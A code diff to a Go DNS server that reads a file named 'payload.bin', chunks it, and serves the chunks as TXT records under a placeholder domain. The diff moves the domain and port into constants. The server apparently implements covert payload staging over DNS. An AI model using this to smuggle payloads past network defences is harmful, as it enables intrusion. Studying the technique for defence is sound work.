@@ -14,6 +14,8 @@ import (
 )
 
 const payloadFile = "payload.bin"
+const domain = "domain.com"
+const port = ":5553"
 
 var chunks map[string]string
 
@@ -52,7 +54,7 @@ func (this *handler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 	case dns.TypeNS:
 		log.Printf("NS request for %s\n", r.Question[0].Name)
 
-		rr, err := dns.NewRR(fmt.Sprintf("uuid.domain.com NS ns.domain.com"))
+		rr, err := dns.NewRR(fmt.Sprintf("%s NS ns.%s", r.Question[0].Name, domain))
 		if err != nil {
 			return
 		}
@@ -68,7 +70,7 @@ func (this *handler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 			val = ""
 		}
 
-		rr, err := dns.NewRR(fmt.Sprintf("%s.domain.com TXT %s", key, val))
+		rr, err := dns.NewRR(fmt.Sprintf("%s TXT %s", r.Question[0].Name, val))
 		if err == nil {
 			msg.Answer = append(msg.Answer, rr)
 		}
@@ -83,13 +85,13 @@ func main() {
 	// Open our payload file and chunk it.
 	data, err := ioutil.ReadFile(payloadFile)
 	if err != nil {
-		log.Print("Failed to read file.")
+		log.Print("Failed to read payload.")
 	} else {
 		chunk(data)
 	}
 
 	// Start our DNS server.
-	srv := &dns.Server{Addr: ":" + strconv.Itoa(53), Net: "udp"}
+	srv := &dns.Server{Addr: port, Net: "udp"}
 	srv.Handler = &handler{}
 	if err := srv.ListenAndServe(); err != nil {
 		log.Fatalf("Failed to set udp listener %s\n", err.Error())
